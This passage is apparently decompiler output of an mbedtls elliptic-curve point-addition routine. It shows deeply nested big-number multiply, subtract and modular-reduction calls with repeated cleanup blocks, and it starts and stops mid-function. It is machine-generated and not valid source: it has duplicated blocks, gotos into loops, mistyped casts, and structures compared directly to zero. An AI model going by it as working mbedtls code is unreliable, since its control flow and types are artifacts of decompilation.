                                                                                                                                                    g216++;
                                                                                                                                                    v49 = mbedtls_mpi_sub_mpi(&v53, &v57, &v58);
                                                                                                                                                    g1 = v49;
                                                                                                                                                    if (v49 == 0) {
                                                                                                                                                        while (true) {
                                                                                                                                                            // 0x805d2d5
                                                                                                                                                            if (v53 <= 0) {
                                                                                                                                                                goto lab_0x805d2db_3;
                                                                                                                                                            }
                                                                                                                                                            // 0x805d311
                                                                                                                                                            g1 = v7;
                                                                                                                                                            v50 = mbedtls_mpi_copy((char *)v7, &v59);
                                                                                                                                                            g1 = v50;
                                                                                                                                                            if (v50 == 0) {
                                                                                                                                                                // 0x805d32b
                                                                                                                                                                v10 = v7 + 12;
                                                                                                                                                                g1 = v10;
                                                                                                                                                                v51 = mbedtls_mpi_copy((char *)v10, &v53);
                                                                                                                                                                g1 = v51;
                                                                                                                                                                if (v51 == 0) {
                                                                                                                                                                    // 0x805d348
                                                                                                                                                                    v11 = v7 + 24;
                                                                                                                                                                    g1 = v11;
                                                                                                                                                                    v52 = mbedtls_mpi_copy((char *)v11, &v54);
                                                                                                                                                                    g1 = v52;
                                                                                                                                                                    result3 = v52;
                                                                                                                                                                    // branch -> 0x805cd23
                                                                                                                                                                    // 0x805cd23
                                                                                                                                                                    g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                                                                                                                    g1 = mbedtls_mpi_free(&v56);
                                                                                                                                                                    g1 = mbedtls_mpi_free(&v57);
                                                                                                                                                                    g1 = mbedtls_mpi_free(&v58);
                                                                                                                                                                    g1 = mbedtls_mpi_free(&v59);
                                                                                                                                                                    g1 = mbedtls_mpi_free(&v53);
                                                                                                                                                                    mbedtls_mpi_free(&v54);
                                                                                                                                                                    g1 = result3;
                                                                                                                                                                    // branch -> 0x805cd79
                                                                                                                                                                    // 0x805cd79
                                                                                                                                                                    g3 = v4;
                                                                                                                                                                    g7 = v3;
                                                                                                                                                                    g5 = v1;
                                                                                                                                                                    g2 = v8;
                                                                                                                                                                    return result3;
                                                                                                                                                                }
                                                                                                                                                                result3 = v51;
                                                                                                                                                            } else {
                                                                                                                                                                result3 = v50;
                                                                                                                                                            }
                                                                                                                                                        }
                                                                                                                                                    } else {
                                                                                                                                                        result3 = v49;
                                                                                                                                                    }
                                                                                                                                                } else {
                                                                                                                                                    result3 = v48;
                                                                                                                                                }
                                                                                                                                            } else {
                                                                                                                                                result3 = v47;
                                                                                                                                            }
                                                                                                                                        } else {
                                                                                                                                            result3 = v46;
                                                                                                                                        }
                                                                                                                                    } else {
                                                                                                                                        result3 = v45;
                                                                                                                                    }
                                                                                                                                }
                                                                                                                            } else {
                                                                                                                                result3 = v44;
                                                                                                                            }
                                                                                                                        }
                                                                                                                    } else {
                                                                                                                        result3 = v43;
                                                                                                                    }
                                                                                                                }
                                                                                                            } else {
                                                                                                                result3 = v42;
                                                                                                            }
                                                                                                        } else {
                                                                                                            result3 = v41;
                                                                                                        }
                                                                                                    } else {
                                                                                                        result3 = v40;
                                                                                                    }
                                                                                                } else {
                                                                                                    while (true) {
                                                                                                        // 0x805d0cb
                                                                                                        v72 = g3;
                                                                                                        v38 = mbedtls_mpi_sub_abs((int32_t *)v72, v72, g7);
                                                                                                        g1 = v38;
                                                                                                        if (v38 == 0) {
                                                                                                            goto lab_0x805d0cb_2;
                                                                                                        }
                                                                                                        result3 = v38;
                                                                                                        // 0x805cd23
                                                                                                        g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                                                        g1 = mbedtls_mpi_free(&v56);
                                                                                                        g1 = mbedtls_mpi_free(&v57);
                                                                                                        g1 = mbedtls_mpi_free(&v58);
                                                                                                        g1 = mbedtls_mpi_free(&v59);
                                                                                                        g1 = mbedtls_mpi_free(&v53);
                                                                                                        mbedtls_mpi_free(&v54);
                                                                                                        g1 = result3;
                                                                                                        // branch -> 0x805cd79
                                                                                                        // 0x805cd79
                                                                                                        g3 = v4;
                                                                                                        g7 = v3;
                                                                                                        g5 = v1;
                                                                                                        g2 = v8;
                                                                                                        return result3;
                                                                                                    }
                                                                                                }
                                                                                                // 0x805cd23
                                                                                                g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                                                g1 = mbedtls_mpi_free(&v56);
                                                                                                g1 = mbedtls_mpi_free(&v57);
                                                                                                g1 = mbedtls_mpi_free(&v58);
                                                                                                g1 = mbedtls_mpi_free(&v59);
                                                                                                g1 = mbedtls_mpi_free(&v53);
                                                                                                mbedtls_mpi_free(&v54);
                                                                                                g1 = result3;
                                                                                                // branch -> 0x805cd79
                                                                                                // 0x805cd79
                                                                                                g3 = v4;
                                                                                                g7 = v3;
                                                                                                g5 = v1;
                                                                                                g2 = v8;
                                                                                                return result3;
                                                                                            }
                                                                                            result3 = v37;
                                                                                        } else {
                                                                                            result3 = v36;
                                                                                        }
                                                                                    } else {
                                                                                        result3 = v35;
                                                                                    }
                                                                                } else {
                                                                                    result3 = v34;
                                                                                }
                                                                            } else {
                                                                                result3 = v33;
                                                                            }
                                                                        } else {
                                                                            result3 = v32;
                                                                        }
                                                                    } else {
                                                                        result3 = v31;
                                                                    }
                                                                } else {
                                                                    result3 = v30;
                                                                }
                                                            } else {
                                                                result3 = v29;
                                                            }
                                                            // 0x805cd23
                                                            g1 = mbedtls_mpi_free((int32_t *)g3);
                                                            g1 = mbedtls_mpi_free(&v56);
                                                            g1 = mbedtls_mpi_free(&v57);
                                                            g1 = mbedtls_mpi_free(&v58);
                                                            g1 = mbedtls_mpi_free(&v59);
                                                            g1 = mbedtls_mpi_free(&v53);
                                                            mbedtls_mpi_free(&v54);
                                                            g1 = result3;
                                                            // branch -> 0x805cd79
                                                            // 0x805cd79
                                                            g3 = v4;
                                                            g7 = v3;
                                                            g5 = v1;
                                                            g2 = v8;
                                                            return result3;
                                                        }
                                                    } else {
                                                        result3 = v27;
                                                    }
                                                }
                                            } else {
                                                result3 = v26;
                                            }
                                        } else {
                                            result3 = v25;
                                        }
                                    } else {
                                        result3 = v24;
                                    }
                                } else {
                                    result3 = v23;
                                }
                            } else {
                                result3 = v22;
                            }
                        } else {
                            result3 = v21;
                        }
                    } else {
                        result3 = v20;
                    }
                } else {
                    result3 = v19;
                }
            }
            // 0x805cd23
            g1 = mbedtls_mpi_free((int32_t *)g3);
            g1 = mbedtls_mpi_free(&v56);
            g1 = mbedtls_mpi_free(&v57);
            g1 = mbedtls_mpi_free(&v58);
            g1 = mbedtls_mpi_free(&v59);
            g1 = mbedtls_mpi_free(&v53);
            mbedtls_mpi_free(&v54);
            g1 = result3;
            // branch -> 0x805cd79
            // 0x805cd79
            g3 = v4;
            g7 = v3;
            g5 = v1;
            g2 = v8;
            return result3;
        }
        // 0x805cf30
        g1 = -0x4f80;
        if (mbedtls_mpi_cmp_int(g3, 1) != 0) {
            // 0x805cd79
            g3 = v4;
            g7 = v3;
            g5 = v1;
            g2 = v8;
            return -0x4f80;
        }
        // 0x805ccbe
        v12 = &v55;
        g3 = v12;
        mbedtls_mpi_init(&v55);
        v13 = &v56;
        mbedtls_mpi_init(&v56);
        v14 = &v57;
        mbedtls_mpi_init(&v57);
        v15 = &v58;
        mbedtls_mpi_init(&v58);
        v16 = &v59;
        mbedtls_mpi_init(&v59);
        mbedtls_mpi_init(&v53);
        v17 = &v54;
        mbedtls_mpi_init(&v54);
        v67 = g7;
        v66 = g3;
        v64 = (int32_t *)v67;
        v18 = mbedtls_mpi_mul_mpi((int32_t *)v66, v64, v64);
        g1 = v18;
        result3 = v18;
        if (v18 == 0) {
            // 0x805cda8
            g6 = v6;
            g1 = v12;
            v19 = ecp_modp(v66, v67);
            g1 = v19;
            if (v19 == 0) {
                // 0x805cdbd
                g216++;
                v68 = g3;
                v20 = mbedtls_mpi_mul_mpi(&v56, (int32_t *)v68, (int32_t *)g7);
                g1 = v20;
                if (v20 == 0) {
                    // 0x805cddf
                    g6 = v6;
                    g1 = v13;
                    v21 = ecp_modp(v13, v68);
                    g1 = v21;
                    if (v21 == 0) {
                        // 0x805cdf5
                        g216++;
                        v69 = g3;
                        v65 = (int32_t *)v69;
                        v22 = mbedtls_mpi_mul_mpi(v65, v65, (int32_t *)a1);
                        g1 = v22;
                        if (v22 == 0) {
                            // 0x805ce17
                            g6 = v6;
                            g1 = v12;
                            v23 = ecp_modp(v69, v69);
                            g1 = v23;
                            if (v23 == 0) {
                                // 0x805ce2c
                                g216++;
                                v24 = mbedtls_mpi_mul_mpi(&v56, &v56, (int32_t *)(a1 + 12));
                                g1 = v24;
                                if (v24 == 0) {
                                    // 0x805ce54
                                    g6 = v6;
                                    g1 = v13;
                                    v25 = ecp_modp(v13, v13);
                                    g1 = v25;
                                    if (v25 == 0) {
                                        // 0x805ce6a
                                        g216++;
                                        v60 = (int32_t *)g3;
                                        v26 = mbedtls_mpi_sub_mpi(v60, v60, (int32_t *)g5);
                                        g1 = v26;
                                        if (v26 == 0) {
                                            // 0x805ce89
                                            v9 = v6 + 4;
                                            v61 = (int32_t *)v9;
                                            // branch -> 0x805cec6
                                            while (true) {
                                                // 0x805cec6
                                                if (v55 < 0) {
                                                  lab_0x805ce97_2:
                                                    // 0x805ce97
                                                    if (mbedtls_mpi_cmp_int(g3, 0) != 0) {
                                                        int32_t * v76 = (int32_t *)g3;
                                                        int32_t v77 = mbedtls_mpi_add_mpi(v76, v76, v61); // 0x805ceb9
                                                        g1 = v77;
                                                        if (v77 != 0) {
                                                            result3 = v77;
                                                            // break -> 0x805cd23
                                                            break;
                                                        }
                                                        // continue -> 0x805cec6
                                                        continue;
                                                    }
                                                }
                                                // 0x805cecc
                                                v62 = (int32_t *)(g5 + 12);
                                                v27 = mbedtls_mpi_sub_mpi(&v56, &v56, v62);
                                                g1 = v27;
                                                if (v27 == 0) {
                                                    while (true) {
                                                        // 0x805cef0
                                                        if (v56 <= 0) {
                                                          lab_0x805cef6_2:
                                                            // 0x805cef6
                                                            if (mbedtls_mpi_cmp_int(v13, 0) != 0) {
                                                                int32_t v78 = mbedtls_mpi_add_mpi(&v56, &v56, v61); // 0x805cf1e
                                                                g1 = v78;
                                                                if (v78 != 0) {
                                                                    result3 = v78;
                                                                    // break -> 0x805cd23
                                                                    break;
                                                                }
                                                                // continue -> 0x805cef0
                                                                continue;
                                                            }
                                                        }
                                                        // 0x805cf72
                                                        if (mbedtls_mpi_cmp_int(g3, 0) == 0) {
                                                            // 0x805cf86
                                                            v28 = mbedtls_mpi_cmp_int(v13, 0);
                                                            g6 = v7;
                                                            if (v28 != 0) {
                                                                // 0x805d0e4
                                                                v39 = mbedtls_ecp_set_zero(v7);
                                                                g1 = v39;
                                                                result3 = v39;
                                                                // branch -> 0x805cd23
                                                                // 0x805cd23
                                                                g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                g1 = mbedtls_mpi_free(&v56);
                                                                g1 = mbedtls_mpi_free(&v57);
                                                                g1 = mbedtls_mpi_free(&v58);
                                                                g1 = mbedtls_mpi_free(&v59);
                                                                g1 = mbedtls_mpi_free(&v53);
                                                                mbedtls_mpi_free(&v54);
                                                                g1 = result3;
                                                                // branch -> 0x805cd79
                                                                // 0x805cd79
                                                                g3 = v4;
                                                                g7 = v3;
                                                                g5 = v1;
                                                                g2 = v8;
                                                                return result3;
                                                            }
                                                            // 0x805cfa1
                                                            g4 = g5;
                                                            g1 = v6;
                                                            ecp_double_jac(v13, 0);
                                                            result3 = g1;
                                                            // branch -> 0x805cd23
                                                            // 0x805cd23
                                                            g1 = mbedtls_mpi_free((int32_t *)g3);
                                                            g1 = mbedtls_mpi_free(&v56);
                                                            g1 = mbedtls_mpi_free(&v57);
                                                            g1 = mbedtls_mpi_free(&v58);
                                                            g1 = mbedtls_mpi_free(&v59);
                                                            g1 = mbedtls_mpi_free(&v53);
                                                            mbedtls_mpi_free(&v54);
                                                            g1 = result3;
                                                            // branch -> 0x805cd79
                                                            // 0x805cd79
                                                            g3 = v4;
                                                            g7 = v3;
                                                            g5 = v1;
                                                            g2 = v8;
                                                            return result3;
                                                        }
                                                        // 0x805cfb6
                                                        v70 = g7;
                                                        v29 = mbedtls_mpi_mul_mpi(&v54, (int32_t *)v70, (int32_t *)g3);
                                                        g1 = v29;
                                                        if (v29 == 0) {
                                                            // 0x805cfd1
                                                            g6 = v6;
                                                            g1 = v17;
                                                            v30 = ecp_modp(v17, v70);
                                                            g1 = v30;
                                                            if (v30 == 0) {
                                                                // 0x805cfe7
                                                                g216++;
                                                                v71 = g3;
                                                                v63 = (int32_t *)v71;
                                                                v31 = mbedtls_mpi_mul_mpi(&v57, v63, v63);
                                                                g1 = v31;
                                                                if (v31 == 0) {
                                                                    // 0x805d009
                                                                    g6 = v6;
                                                                    g1 = v14;
                                                                    v32 = ecp_modp(v14, v71);
                                                                    g1 = v32;
                                                                    if (v32 == 0) {
                                                                        // 0x805d01f
                                                                        g216++;
                                                                        v33 = mbedtls_mpi_mul_mpi(&v58, &v57, (int32_t *)g3);
                                                                        g1 = v33;
                                                                        if (v33 == 0) {
                                                                            // 0x805d044
                                                                            g6 = v6;
                                                                            g1 = v15;
                                                                            v34 = ecp_modp(v15, v14);
                                                                            g1 = v34;
                                                                            if (v34 == 0) {
                                                                                // 0x805d05a
                                                                                g216++;
                                                                                v35 = mbedtls_mpi_mul_mpi(&v57, &v57, (int32_t *)g5);
                                                                                g1 = v35;
                                                                                if (v35 == 0) {
                                                                                    // 0x805d07c
                                                                                    g6 = v6;
                                                                                    g1 = v14;
                                                                                    v36 = ecp_modp(v14, v14);
                                                                                    g1 = v36;
                                                                                    if (v36 == 0) {
                                                                                        // 0x805d092
                                                                                        g216++;
                                                                                        v37 = mbedtls_mpi_mul_int(g3, v14, 2);
                                                                                        g1 = v37;
                                                                                        if (v37 == 0) {
                                                                                            // 0x805d0b8
                                                                                            g7 = v9;
                                                                                            if (mbedtls_mpi_cmp_mpi((int32_t *)g3, v61) < 0) {
                                                                                                // 0x805d0f5
                                                                                                v40 = mbedtls_mpi_mul_mpi(&v59, &v56, &v56);
                                                                                                g1 = v40;
                                                                                                if (v40 == 0) {
                                                                                                    // 0x805d113
                                                                                                    g6 = v6;
                                                                                                    g1 = v16;
                                                                                                    v41 = ecp_modp(v16, v13);
                                                                                                    g1 = v41;
                                                                                                    if (v41 == 0) {
                                                                                                        // 0x805d129
                                                                                                        g216++;
                                                                                                        v42 = mbedtls_mpi_sub_mpi(&v59, &v59, (int32_t *)g3);
                                                                                                        g1 = v42;
                                                                                                        if (v42 == 0) {
                                                                                                            while (true) {
                                                                                                                // 0x805d14b
                                                                                                                if (v59 <= 0) {
                                                                                                                  lab_0x805d151_3:
                                                                                                                    // 0x805d151
                                                                                                                    if (mbedtls_mpi_cmp_int(v16, 0) != 0) {
                                                                                                                        int32_t v79 = mbedtls_mpi_add_mpi(&v59, &v59, v61); // 0x805d179
                                                                                                                        g1 = v79;
                                                                                                                        if (v79 != 0) {
                                                                                                                            result3 = v79;
                                                                                                                            // break -> 0x805cd23
                                                                                                                            break;
                                                                                                                        }
                                                                                                                        // continue -> 0x805d14b
                                                                                                                        continue;
                                                                                                                    }
                                                                                                                }
                                                                                                                // 0x805d187
                                                                                                                v43 = mbedtls_mpi_sub_mpi(&v59, &v59, &v58);
                                                                                                                g1 = v43;
                                                                                                                if (v43 == 0) {
                                                                                                                    while (true) {
                                                                                                                        // 0x805d1a5
                                                                                                                        if (v59 <= 0) {
                                                                                                                          lab_0x805d1ab_3:
                                                                                                                            // 0x805d1ab
                                                                                                                            if (mbedtls_mpi_cmp_int(v16, 0) != 0) {
                                                                                                                                int32_t v80 = mbedtls_mpi_add_mpi(&v59, &v59, v61); // 0x805d1d3
                                                                                                                                g1 = v80;
                                                                                                                                if (v80 != 0) {
                                                                                                                                    result3 = v80;
                                                                                                                                    // break -> 0x805cd23
                                                                                                                                    break;
                                                                                                                                }
                                                                                                                                // continue -> 0x805d1a5
                                                                                                                                continue;
                                                                                                                            }
                                                                                                                        }
                                                                                                                        // 0x805d1e1
                                                                                                                        v44 = mbedtls_mpi_sub_mpi(&v57, &v57, &v59);
                                                                                                                        g1 = v44;
                                                                                                                        if (v44 == 0) {
                                                                                                                            while (true) {
                                                                                                                                // 0x805d1ff
                                                                                                                                if (v57 <= 0) {
                                                                                                                                  lab_0x805d205_3:
                                                                                                                                    // 0x805d205
                                                                                                                                    if (mbedtls_mpi_cmp_int(v14, 0) != 0) {
                                                                                                                                        int32_t v81 = mbedtls_mpi_add_mpi(&v57, &v57, v61); // 0x805d22d
                                                                                                                                        g1 = v81;
                                                                                                                                        if (v81 != 0) {
                                                                                                                                            result3 = v81;
                                                                                                                                            // break -> 0x805cd23
                                                                                                                                            break;
                                                                                                                                        }
                                                                                                                                        // continue -> 0x805d1ff
                                                                                                                                        continue;
                                                                                                                                    }
                                                                                                                                }
                                                                                                                                // 0x805d23b
                                                                                                                                v45 = mbedtls_mpi_mul_mpi(&v57, &v57, &v56);
                                                                                                                                g1 = v45;
                                                                                                                                if (v45 == 0) {
                                                                                                                                    // 0x805d259
                                                                                                                                    g6 = v6;
                                                                                                                                    g1 = v14;
                                                                                                                                    v46 = ecp_modp(v14, v14);
                                                                                                                                    g1 = v46;
                                                                                                                                    if (v46 == 0) {
                                                                                                                                        // 0x805d26f
                                                                                                                                        g216++;
                                                                                                                                        v47 = mbedtls_mpi_mul_mpi(&v58, &v58, v62);
                                                                                                                                        g1 = v47;
                                                                                                                                        if (v47 == 0) {
                                                                                                                                            // 0x805d297
                                                                                                                                            g6 = v6;
                                                                                                                                            g1 = v15;
                                                                                                                                            v48 = ecp_modp(v15, v15);
                                                                                                                                            g1 = v48;
                                                                                                                                            if (v48 == 0) {
                                                                                                                                                // 0x805d2ad
                                                                                                                                                g216++;
                                                                                                                                                v49 = mbedtls_mpi_sub_mpi(&v53, &v57, &v58);
                                                                                                                                                g1 = v49;
                                                                                                                                                if (v49 == 0) {
                                                                                                                                                    while (true) {
                                                                                                                                                        // 0x805d2d5
                                                                                                                                                        if (v53 <= 0) {
                                                                                                                                                          lab_0x805d2db_3:
                                                                                                                                                            // 0x805d2db
                                                                                                                                                            if (mbedtls_mpi_cmp_int((int32_t)&v53, 0) != 0) {
                                                                                                                                                                int32_t v82 = mbedtls_mpi_add_mpi(&v53, &v53, v61); // 0x805d303
                                                                                                                                                                g1 = v82;
                                                                                                                                                                if (v82 != 0) {
                                                                                                                                                                    result3 = v82;
                                                                                                                                                                    // break -> 0x805cd23
                                                                                                                                                                    break;
                                                                                                                                                                }
                                                                                                                                                                // continue -> 0x805d2d5
                                                                                                                                                                continue;
                                                                                                                                                            }
                                                                                                                                                        }
                                                                                                                                                        // 0x805d311
                                                                                                                                                        g1 = v7;
                                                                                                                                                        v50 = mbedtls_mpi_copy((char *)v7, &v59);
                                                                                                                                                        g1 = v50;
                                                                                                                                                        if (v50 == 0) {
                                                                                                                                                            // 0x805d32b
                                                                                                                                                            v10 = v7 + 12;
                                                                                                                                                            g1 = v10;
                                                                                                                                                            v51 = mbedtls_mpi_copy((char *)v10, &v53);
                                                                                                                                                            g1 = v51;
                                                                                                                                                            if (v51 == 0) {
                                                                                                                                                                // 0x805d348
                                                                                                                                                                v11 = v7 + 24;
                                                                                                                                                                g1 = v11;
                                                                                                                                                                v52 = mbedtls_mpi_copy((char *)v11, &v54);
                                                                                                                                                                g1 = v52;
                                                                                                                                                                result3 = v52;
                                                                                                                                                                // branch -> 0x805cd23
                                                                                                                                                                // 0x805cd23
                                                                                                                                                                g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                                                                                                                g1 = mbedtls_mpi_free(&v56);
                                                                                                                                                                g1 = mbedtls_mpi_free(&v57);
                                                                                                                                                                g1 = mbedtls_mpi_free(&v58);
                                                                                                                                                                g1 = mbedtls_mpi_free(&v59);
                                                                                                                                                                g1 = mbedtls_mpi_free(&v53);
                                                                                                                                                                mbedtls_mpi_free(&v54);
                                                                                                                                                                g1 = result3;
                                                                                                                                                                // branch -> 0x805cd79
                                                                                                                                                                // 0x805cd79
                                                                                                                                                                g3 = v4;
                                                                                                                                                                g7 = v3;
                                                                                                                                                                g5 = v1;
                                                                                                                                                                g2 = v8;
                                                                                                                                                                return result3;
                                                                                                                                                            }
                                                                                                                                                            result3 = v51;
                                                                                                                                                        } else {
                                                                                                                                                            result3 = v50;
                                                                                                                                                        }
                                                                                                                                                    }
                                                                                                                                                    // 0x805cd23
                                                                                                                                                    g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                                                                                                    g1 = mbedtls_mpi_free(&v56);
                                                                                                                                                    g1 = mbedtls_mpi_free(&v57);
                                                                                                                                                    g1 = mbedtls_mpi_free(&v58);
                                                                                                                                                    g1 = mbedtls_mpi_free(&v59);
                                                                                                                                                    g1 = mbedtls_mpi_free(&v53);
                                                                                                                                                    mbedtls_mpi_free(&v54);
                                                                                                                                                    g1 = result3;
                                                                                                                                                    // branch -> 0x805cd79
                                                                                                                                                    // 0x805cd79
                                                                                                                                                    g3 = v4;
                                                                                                                                                    g7 = v3;
                                                                                                                                                    g5 = v1;
                                                                                                                                                    g2 = v8;
                                                                                                                                                    return result3;
                                                                                                                                                }
                                                                                                                                                result3 = v49;
                                                                                                                                            } else {
                                                                                                                                                result3 = v48;
                                                                                                                                            }
                                                                                                                                        } else {
                                                                                                                                            result3 = v47;
                                                                                                                                        }
                                                                                                                                    } else {
                                                                                                                                        result3 = v46;
                                                                                                                                    }
                                                                                                                                } else {
                                                                                                                                    result3 = v45;
                                                                                                                                }
                                                                                                                            }
                                                                                                                        } else {
                                                                                                                            result3 = v44;
                                                                                                                        }
                                                                                                                    }
                                                                                                                } else {
                                                                                                                    result3 = v43;
                                                                                                                }
                                                                                                            }
                                                                                                        } else {
                                                                                                            result3 = v42;
                                                                                                        }
                                                                                                    } else {
                                                                                                        result3 = v41;
                                                                                                    }
                                                                                                } else {
                                                                                                    result3 = v40;
                                                                                                }
                                                                                            } else {
                                                                                                while (true) {
                                                                                                    // 0x805d0cb
                                                                                                    v72 = g3;
                                                                                                    v38 = mbedtls_mpi_sub_abs((int32_t *)v72, v72, g7);
                                                                                                    g1 = v38;
                                                                                                    if (v38 == 0) {
                                                                                                      lab_0x805d0cb_2:
                                                                                                        // 0x805d0cb
                                                                                                        if (mbedtls_mpi_cmp_mpi((int32_t *)g3, (int32_t *)g7) < 0) {
                                                                                                            // break -> 0x805d0f5
                                                                                                            break;
                                                                                                        }
                                                                                                        // continue -> 0x805d0cb
                                                                                                        continue;
                                                                                                    }
                                                                                                }
                                                                                                // 0x805d0f5
                                                                                                v40 = mbedtls_mpi_mul_mpi(&v59, &v56, &v56);
                                                                                                g1 = v40;
                                                                                                if (v40 == 0) {
                                                                                                    // 0x805d113
                                                                                                    g6 = v6;
                                                                                                    g1 = v16;
                                                                                                    v41 = ecp_modp(v16, v13);
                                                                                                    g1 = v41;
                                                                                                    if (v41 == 0) {
                                                                                                        // 0x805d129
                                                                                                        g216++;
                                                                                                        v42 = mbedtls_mpi_sub_mpi(&v59, &v59, (int32_t *)g3);
                                                                                                        g1 = v42;
                                                                                                        if (v42 == 0) {
                                                                                                            while (true) {
                                                                                                                // 0x805d14b
                                                                                                                if (v59 <= 0) {
                                                                                                                    goto lab_0x805d151_3;
                                                                                                                }
                                                                                                                // 0x805d187
                                                                                                                v43 = mbedtls_mpi_sub_mpi(&v59, &v59, &v58);
                                                                                                                g1 = v43;
                                                                                                                if (v43 == 0) {
                                                                                                                    while (true) {
                                                                                                                        // 0x805d1a5
                                                                                                                        if (v59 <= 0) {
                                                                                                                            goto lab_0x805d1ab_3;
                                                                                                                        }
                                                                                                                        // 0x805d1e1
                                                                                                                        v44 = mbedtls_mpi_sub_mpi(&v57, &v57, &v59);
                                                                                                                        g1 = v44;
                                                                                                                        if (v44 == 0) {
                                                                                                                            while (true) {
                                                                                                                                // 0x805d1ff
                                                                                                                                if (v57 <= 0) {
                                                                                                                                    goto lab_0x805d205_3;
                                                                                                                                }
                                                                                                                                // 0x805d23b
                                                                                                                                v45 = mbedtls_mpi_mul_mpi(&v57, &v57, &v56);
                                                                                                                                g1 = v45;
                                                                                                                                if (v45 == 0) {
                                                                                                                                    // 0x805d259
                                                                                                                                    g6 = v6;
                                                                                                                                    g1 = v14;
                                                                                                                                    v46 = ecp_modp(v14, v14);
                                                                                                                                    g1 = v46;
                                                                                                                                    if (v46 == 0) {
                                                                                                                                        // 0x805d26f
                                                                                                                                        g216++;
                                                                                                                                        v47 = mbedtls_mpi_mul_mpi(&v58, &v58, v62);
                                                                                                                                        g1 = v47;
                                                                                                                                        if (v47 == 0) {
                                                                                                                                            // 0x805d297
                                                                                                                                            g6 = v6;
                                                                                                                                            g1 = v15;
                                                                                                                                            v48 = ecp_modp(v15, v15);
                                                                                                                                            g1 = v48;
                                                                                                                                            if (v48 == 0) {
                                                                                                                                                // 0x805d2ad
                                                                                                                                                g216++;
                                                                                                                                                v49 = mbedtls_mpi_sub_mpi(&v53, &v57, &v58);
                                                                                                                                                g1 = v49;
                                                                                                                                                if (v49 == 0) {
                                                                                                                                                    while (true) {
                                                                                                                                                        // 0x805d2d5
                                                                                                                                                        if (v53 <= 0) {
                                                                                                                                                            goto lab_0x805d2db_3;
                                                                                                                                                        }
                                                                                                                                                        // 0x805d311
                                                                                                                                                        g1 = v7;
                                                                                                                                                        v50 = mbedtls_mpi_copy((char *)v7, &v59);
                                                                                                                                                        g1 = v50;
                                                                                                                                                        if (v50 == 0) {
                                                                                                                                                            // 0x805d32b
                                                                                                                                                            v10 = v7 + 12;
                                                                                                                                                            g1 = v10;
                                                                                                                                                            v51 = mbedtls_mpi_copy((char *)v10, &v53);
                                                                                                                                                            g1 = v51;
                                                                                                                                                            if (v51 == 0) {
                                                                                                                                                                // 0x805d348
                                                                                                                                                                v11 = v7 + 24;
                                                                                                                                                                g1 = v11;
                                                                                                                                                                v52 = mbedtls_mpi_copy((char *)v11, &v54);
                                                                                                                                                                g1 = v52;
                                                                                                                                                                result3 = v52;
                                                                                                                                                                // branch -> 0x805cd23
                                                                                                                                                                // 0x805cd23
                                                                                                                                                                g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                                                                                                                g1 = mbedtls_mpi_free(&v56);
                                                                                                                                                                g1 = mbedtls_mpi_free(&v57);
                                                                                                                                                                g1 = mbedtls_mpi_free(&v58);
                                                                                                                                                                g1 = mbedtls_mpi_free(&v59);
                                                                                                                                                                g1 = mbedtls_mpi_free(&v53);
                                                                                                                                                                mbedtls_mpi_free(&v54);
                                                                                                                                                                g1 = result3;
                                                                                                                                                                // branch -> 0x805cd79
                                                                                                                                                                // 0x805cd79
                                                                                                                                                                g3 = v4;
                                                                                                                                                                g7 = v3;
                                                                                                                                                                g5 = v1;
                                                                                                                                                                g2 = v8;
                                                                                                                                                                return result3;
                                                                                                                                                            }
                                                                                                                                                            result3 = v51;
                                                                                                                                                        } else {
                                                                                                                                                            result3 = v50;
                                                                                                                                                        }
                                                                                                                                                    }
                                                                                                                                                } else {
                                                                                                                                                    result3 = v49;
                                                                                                                                                }
                                                                                                                                            } else {
                                                                                                                                                result3 = v48;
                                                                                                                                            }
                                                                                                                                        } else {
                                                                                                                                            result3 = v47;
                                                                                                                                        }
                                                                                                                                    } else {
                                                                                                                                        result3 = v46;
                                                                                                                                    }
                                                                                                                                } else {
                                                                                                                                    result3 = v45;
                                                                                                                                }
                                                                                                                            }
                                                                                                                        } else {
                                                                                                                            result3 = v44;
                                                                                                                        }
                                                                                                                    }
                                                                                                                } else {
                                                                                                                    result3 = v43;
                                                                                                                }
                                                                                                            }
                                                                                                        } else {
                                                                                                            result3 = v42;
                                                                                                        }
                                                                                                    } else {
                                                                                                        result3 = v41;
                                                                                                    }
                                                                                                } else {
                                                                                                    result3 = v40;
                                                                                                }
                                                                                            }
                                                                                            // 0x805cd23
                                                                                            g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                                            g1 = mbedtls_mpi_free(&v56);
                                                                                            g1 = mbedtls_mpi_free(&v57);
                                                                                            g1 = mbedtls_mpi_free(&v58);
                                                                                            g1 = mbedtls_mpi_free(&v59);
                                                                                            g1 = mbedtls_mpi_free(&v53);
                                                                                            mbedtls_mpi_free(&v54);
                                                                                            g1 = result3;
                                                                                            // branch -> 0x805cd79
                                                                                            // 0x805cd79
                                                                                            g3 = v4;
                                                                                            g7 = v3;
                                                                                            g5 = v1;
                                                                                            g2 = v8;
                                                                                            return result3;
                                                                                        }
                                                                                        result3 = v37;
                                                                                    } else {
                                                                                        result3 = v36;
                                                                                    }
                                                                                } else {
                                                                                    result3 = v35;
                                                                                }
                                                                            } else {
                                                                                result3 = v34;
                                                                            }
                                                                        } else {
                                                                            result3 = v33;
                                                                        }
                                                                    } else {
                                                                        result3 = v32;
                                                                    }
                                                                } else {
                                                                    result3 = v31;
                                                                }
                                                            } else {
                                                                result3 = v30;
                                                            }
                                                        } else {
                                                            result3 = v29;
                                                        }
                                                        // 0x805cd23
                                                        g1 = mbedtls_mpi_free((int32_t *)g3);
                                                        g1 = mbedtls_mpi_free(&v56);
                                                        g1 = mbedtls_mpi_free(&v57);
                                                        g1 = mbedtls_mpi_free(&v58);
                                                        g1 = mbedtls_mpi_free(&v59);
                                                        g1 = mbedtls_mpi_free(&v53);
                                                        mbedtls_mpi_free(&v54);
                                                        g1 = result3;
                                                        // branch -> 0x805cd79
                                                        // 0x805cd79
                                                        g3 = v4;
                                                        g7 = v3;
                                                        g5 = v1;
                                                        g2 = v8;
                                                        return result3;
                                                    }
                                                } else {
                                                    result3 = v27;
                                                }
                                            }
                                        } else {
                                            result3 = v26;
                                        }
                                    } else {
                                        result3 = v25;
                                    }
                                } else {
                                    result3 = v24;
                                }
                            } else {
                                result3 = v23;
                            }
                        } else {
                            result3 = v22;
                        }
                    } else {
